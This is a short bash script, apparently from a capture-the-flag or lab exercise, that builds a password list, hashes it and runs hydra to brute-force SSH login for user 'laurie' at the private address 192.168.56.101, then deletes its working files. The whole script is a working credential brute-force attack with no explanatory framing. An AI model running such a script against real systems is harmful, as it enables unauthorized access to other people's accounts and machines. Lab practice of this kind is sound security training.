#! /bin/bash
c++ pwGenerator.cpp -o pwGenerator && ./pwGenerator > pwList.txt;
bash ./hash.sh pwList.txt > pwListHashed.txt;
hydra -l laurie -P pwListHashed.txt ssh://192.168.56.101 -t 4
rm pwGenerator;
rm pwList.txt;
rm pwListHashed.txt;

